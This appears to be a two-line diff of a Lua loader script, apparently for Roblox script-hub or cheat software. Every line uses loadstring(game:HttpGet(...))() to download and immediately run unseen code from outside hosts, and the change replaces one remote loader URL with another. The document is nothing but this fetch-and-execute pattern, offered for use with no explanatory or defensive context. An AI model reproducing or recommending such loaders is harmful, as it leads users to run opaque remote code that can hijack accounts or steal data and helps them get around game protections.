@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://pastefy.app/R3NIbQ11/raw"))()
-loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fda9babd071d6b536a745774b6bc681c.lua"))()
